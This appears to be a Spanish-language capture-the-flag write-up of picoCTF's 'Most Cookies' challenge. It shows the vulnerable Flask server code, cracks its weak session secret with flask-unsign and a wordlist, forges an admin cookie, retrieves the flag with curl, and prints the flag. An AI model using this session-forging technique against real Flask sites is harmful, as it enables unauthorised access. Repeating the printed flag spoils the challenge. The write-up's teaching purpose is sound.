Alright, enough of using my own encryption. Flask session cookies should be plenty secure! [server.py](https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py) [http://mercury.picoctf.net:6259/](http://mercury.picoctf.net:6259/)

Hints:
1.-How secure is a flask cookie?

### Solucion;

```
Descargamos el archivo y vemos la cookie que sugiere el sitio;
──(kali㉿kali)-[~/Documents]
└─$ wget https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py              
--2025-04-01 23:38:25--  https://mercury.picoctf.net/static/cae5577e6b8f86e17d7884723204f61e/server.py
Resolving mercury.picoctf.net (mercury.picoctf.net)... 18.189.209.142
Connecting to mercury.picoctf.net (mercury.picoctf.net)|18.189.209.142|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2021 (2.0K) [application/octet-stream]
Saving to: ‘server.py’

server.py                              100%[===========================================================================>]   1.97K  --.-KB/s    in 0s      

2025-04-01 23:38:25 (36.1 MB/s) - ‘server.py’ saved [2021/2021]

                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents]
└─$ echo eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-yxjA.dr2sOrUXKm1rsiZY_pCEjgJR_Wg | base64 -d
{"very_auth":"snickerdoodle"}base64: invalid input
                                                                                                                                                           
┌──(kali㉿kali)-[~/Documents]
└─$ cat server.py       
from flask import Flask, render_template, request, url_for, redirect, make_response, flash, session
import random
app = Flask(__name__)
flag_value = open("./flag").read().rstrip()
title = "Most Cookies"
cookie_names = ["snickerdoodle", "chocolate chip", "oatmeal raisin", "gingersnap", "shortbread", "peanut butter", "whoopie pie", "sugar", "molasses", "kiss", "biscotti", "butter", "spritz", "snowball", "drop", "thumbprint", "pinwheel", "wafer", "macaroon", "fortune", "crinkle", "icebox", "gingerbread", "tassie", "lebkuchen", "macaron", "black and white", "white chocolate macadamia"]
app.secret_key = random.choice(cookie_names)

@app.route("/")
def main():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "blank":
                        return render_template("index.html", title=title)
                else:
                        return make_response(redirect("/display"))
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/search", methods=["GET", "POST"])
def search():
        if "name" in request.form and request.form["name"] in cookie_names:
                resp = make_response(redirect("/display"))
                session["very_auth"] = request.form["name"]
                return resp
        else:
                message = "That doesn't appear to be a valid cookie."
                category = "danger"
                flash(message, category)
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

@app.route("/reset")
def reset():
        resp = make_response(redirect("/"))
        session.pop("very_auth", None)
        return resp

@app.route("/display", methods=["GET"])
def flag():
        if session.get("very_auth"):
                check = session["very_auth"]
                if check == "admin":
                        resp = make_response(render_template("flag.html", value=flag_value, title=title))
                        return resp
                flash("That is a cookie! Not very special though...", "success")
                return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
        else:
                resp = make_response(redirect("/"))
                session["very_auth"] = "blank"
                return resp

if __name__ == "__main__":
        app.run()

Podemos ver que el codigo lanzara tentativamente la flag si le firmamos una cookie con admin, para esto debemos ver que cookie es la correcta con la que firma
para esto hacemos uso de flask-unsign y uso de un diccionario creado con las cookies posibles(cookies.txt) y la cookie original:
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.Z-yxjA.dr2sOrUXKm1rsiZY_pCEjgJR_Wg" --wordlist cookies.txt 

nos da la cookie correcta (nombre): 'gingersnap'
ahora forjamos la cookie con ayuda de eso:
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret "gingersnap"                                                     
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-y7bw.H9N5qi5L5_BsmAkGcn3TwJAgIpg

Con ayuda de curl y la nueva cookie obtenemos la flag:
curl -s http://mercury.picoctf.net:6259/display -H "Cookie: session=eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.Z-y7bw.H9N5qi5L5_BsmAkGcn3TwJAgIpg" | grep pico
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{pwn_4ll_th3_cook1E5_5f016958}</code></p>

```